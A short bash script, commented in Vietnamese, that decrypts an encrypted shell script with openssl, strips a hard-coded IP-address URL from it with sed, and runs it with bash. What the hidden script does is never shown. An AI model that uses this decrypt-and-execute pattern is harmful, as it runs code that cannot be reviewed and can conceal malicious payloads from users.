#!/bin/bash

# Giải mã nội dung của file tuananh.sh.enc
openssl enc -aes-256-cbc -d -in tuananh.sh.enc -out tuananh.sh -k "your_password" -pbkdf2
sed -i 's|http://52.45.92.157||g' tuananh.sh

# Chạy file tuananh.sh
bash tuananh.sh
